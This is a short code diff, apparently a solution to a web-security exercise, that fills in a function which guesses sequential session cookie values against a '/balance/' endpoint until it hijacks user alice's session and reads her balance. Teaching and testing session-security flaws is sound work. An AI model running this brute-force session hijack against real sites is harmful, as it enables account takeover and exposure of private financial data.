@@ -4,10 +4,19 @@ import json
 
 
 def test_session(address):
-	# write your code here
-	return None
+    # write your code here
+    response = 0
+    address += "/balance/"
+    for num in range(10):
+        session_value = 'session-'+str(num)
+        reqst = requests.get(address, cookies = {"sessionid":session_value})
+        if reqst.status_code == 200:
+           #page found read the data for alice
+            data = json.loads(reqst.text)
+            if data['username'] == "alice":
+                response = data['balance']
 
-
+    return response
 
 def main(argv):
 	address = sys.argv[1]
